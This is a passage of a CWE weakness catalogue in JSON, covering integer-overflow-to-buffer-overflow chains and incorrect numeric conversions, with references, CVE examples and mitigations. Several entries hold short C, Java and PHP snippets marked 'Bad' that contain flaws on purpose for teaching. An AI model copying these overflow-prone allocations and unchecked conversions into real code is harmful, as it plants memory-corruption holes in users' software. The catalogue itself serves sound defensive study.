          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MSC30-C",
          "EntryName": "Do not use the rand() function for generating pseudorandom numbers",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "STR31-C",
          "EntryName": "Guarantee that storage for strings has sufficient space for character data and the null terminator",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        },
        {
          "ExternalReferenceID": "REF-554",
          "Authors": [
            "Michael Howard"
          ],
          "Title": "Security Development Lifecycle (SDL) Banned Function Calls",
          "URL": "https://learn.microsoft.com/en-us/previous-versions/bb288454(v=msdn.10)?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 5, \"Safe String Handling\" Page 156, 160",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 8, \"C String Handling\", Page 388",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This weakness is different than CWE-242 (Use of Inherently Dangerous Function). CWE-242 covers functions with such significant security problems that they can never be guaranteed to be safe. Some functions, if used properly, do not directly pose a security risk, but can introduce a weakness if not called correctly. These are regarded as potentially dangerous. A well-known example is the strcpy() function. When provided with a destination buffer that is larger than its source, strcpy() will not overflow. However, it is so often misused that some developers prohibit strcpy() entirely."
        }
      ]
    },
    {
      "ID": "680",
      "Name": "Integer Overflow to Buffer Overflow",
      "Abstraction": "Compound",
      "Structure": "Chain",
      "Status": "Draft",
      "Description": "The product performs a calculation to determine how much memory to allocate, but an integer overflow can occur that causes less memory to be allocated than expected, leading to a buffer overflow.",
      "RelatedWeaknesses": [
        {
          "Nature": "StartsWith",
          "CweID": "190",
          "ViewID": "709"
        },
        {
          "Nature": "ChildOf",
          "CweID": "190",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Availability",
            "Confidentiality"
          ],
          "Impact": [
            "Modify Memory",
            "DoS: Crash, Exit, or Restart",
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-33",
          "Entries": [
            {
              "IntroText": "The following image processing code allocates a table for images."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\timg_t table_ptr; /*struct containing img data, 10kB each*/\n\tint num_imgs;\n\t...\n\tnum_imgs = get_num_imgs();\n\ttable_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);\n\t...\n```"
            },
            {
              "BodyText": "This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119)."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-43537",
          "Description": "Chain: in a web browser, an unsigned 64-bit integer is forcibly cast to a 32-bit integer (CWE-681) and potentially leading to an integer overflow (CWE-190). If an integer overflow occurs, this can cause heap memory corruption (CWE-122)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-43537"
        },
        {
          "Reference": "CVE-2017-1000121",
          "Description": "chain: unchecked message size metadata allows integer overflow (CWE-190) leading to buffer overflow (CWE-119).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-1000121"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT30-C",
          "EntryName": "Ensure that unsigned integer operations do not wrap",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT32-C",
          "EntryName": "Ensure that operations on signed integers do not result in overflow",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM35-C",
          "EntryName": "Allocate sufficient memory for an object",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "RelatedAttackPatterns": [
        "10",
        "100",
        "14",
        "24",
        "45",
        "46",
        "47",
        "67",
        "8",
        "9",
        "92"
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a named chain, which combines multiple weaknesses.",
        "Comments": "Mapping to each separate weakness in the chain would be more precise.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "681",
      "Name": "Incorrect Conversion between Numeric Types",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "When converting from one data type to another, such as long to integer, data can be omitted or translated in a way that produces unexpected values. If the resulting values are used in a sensitive context, then dangerous behaviors may occur.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "704",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "704",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "682",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other",
            "Integrity"
          ],
          "Impact": [
            "Unexpected State",
            "Quality Degradation"
          ],
          "Note": "The program could wind up using the wrong number and generate incorrect results. If the number is used to allocate resources or make a security decision, then this could introduce a vulnerability."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Avoid making conversion between numeric types. Always check for the allowed ranges."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example, a float literal is cast to an integer, thus causing a loss of precision."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tint i = (int) 33457.8f;\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This code adds a float and an integer together, casting the result to an integer."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$floatVal = 1.8345;\n\t$intVal = 3;\n\t$result = (int)$floatVal + $intVal;\n```"
            },
            {
              "BodyText": "Normally, PHP will preserve the precision of this operation, making $result = 4.8345. After the cast to int, it is reasonable to expect PHP to follow rounding convention and set $result = 5. However, the explicit cast to int always rounds DOWN, so the final value of $result is 4. This behavior may have unintended consequences."
            }
          ]
        },
        {
          "ID": "DX-73",
          "Entries": [
            {
              "IntroText": "In this example the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned int, amount will be implicitly converted to unsigned."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tunsigned int readdata () {\n\t\tint amount = 0;\n\t\t...\n\t\tif (result == ERROR)\n\t\tamount = -1;\n\t\t...\n\t\treturn amount;\n\t}\n```"
            },
            {
              "BodyText": "If the error condition in the code above is met, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers."
            }
          ]
        },
        {
          "ID": "DX-74",
          "Entries": [
            {
              "IntroText": "In this example, depending on the return value of accecssmainframe(), the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned value, amount will be implicitly cast to an unsigned number."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tunsigned int readdata () {\n\t\tint amount = 0;\n\t\t...\n\t\tamount = accessmainframe();\n\t\t...\n\t\treturn amount;\n\t}\n```"
            },
            {
              "BodyText": "If the return value of accessmainframe() is -1, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-2639",
          "Description": "Chain: integer coercion error (CWE-192) prevents a return value from indicating an error, leading to out-of-bounds write (CWE-787)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-2639"
        },
        {
          "Reference": "CVE-2021-43537",
          "Description": "Chain: in a web browser, an unsigned 64-bit integer is forcibly cast to a 32-bit integer (CWE-681) and potentially leading to an integer overflow (CWE-190). If an integer overflow occurs, this can cause heap memory corruption (CWE-122)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-43537"
        },
        {
          "Reference": "CVE-2007-4268",
          "Description": "Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4268"
        },
        {
          "Reference": "CVE-2007-4988",
          "Description": "Chain: signed short width value in image processor is sign extended during conversion to unsigned int, which leads to integer overflow and heap-based buffer overflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4988"
        },
        {
          "Reference": "CVE-2009-0231",
          "Description": "Integer truncation of length value leads to heap-based buffer overflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0231"
        },
        {
          "Reference": "CVE-2008-3282",
          "Description": "Size of a particular type changes for 64-bit platforms, leading to an integer truncation in document processor causes incorrect index to be generated.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3282"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FLP34-C",
          "EntryName": "Ensure that floating point conversions are within range of the new type",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT15-C",
          "EntryName": "Use intmax_t or uintmax_t for formatted IO on programmer-defined integer types"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT31-C",
          "EntryName": "Ensure that integer conversions do not result in lost or misinterpreted data",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT35-C",
          "EntryName": "Evaluate integer expressions in a larger size before comparing or assigning to that size"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "NUM12-J",
          "EntryName": "Ensure conversions of numeric types to narrower types do not result in lost or misinterpreted data"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        },
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-681"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-681",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    }
  ]
}